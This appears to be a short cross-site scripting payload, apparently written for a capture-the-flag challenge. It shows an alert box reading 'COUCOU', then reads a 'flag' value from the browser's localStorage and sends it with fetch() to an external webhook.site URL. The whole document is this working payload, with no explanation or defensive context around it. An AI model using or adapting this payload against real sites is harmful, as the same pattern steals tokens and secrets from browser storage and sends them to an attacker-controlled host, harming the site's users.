alert("COUCOU")
localStorage.getItem('flag');
fetch("https://webhook.site/e9ffc5ba-28d5-403b-a995-22ece3e79b9e?payload=" + localStorage.getItem('flag') + "");
